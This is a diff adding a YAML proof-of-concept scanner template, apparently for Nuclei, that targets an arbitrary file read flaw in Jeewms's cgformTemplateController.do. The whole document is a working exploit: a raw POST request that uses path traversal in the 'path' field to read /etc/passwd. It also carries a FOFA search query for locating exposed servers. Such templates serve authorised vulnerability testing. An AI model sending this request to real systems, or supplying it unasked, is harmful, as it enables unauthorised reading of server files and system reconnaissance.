@@ -1,0 +1,29 @@
+id: poc-oaek7iz4quisg5o8
+info:
+  name: Jeewms cgformTemplatecontroller.do 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oaek7iz4quisg5o8'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oaek7iz4quisg5o8
+    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+http:
+- raw:
+  - 'POST /rest/../cgformTemplateController.do?showPic HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Content-Type: application/x-www-form-urlencoded
+
+    code=default&path=../../../../../../../../../../etc/passwd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
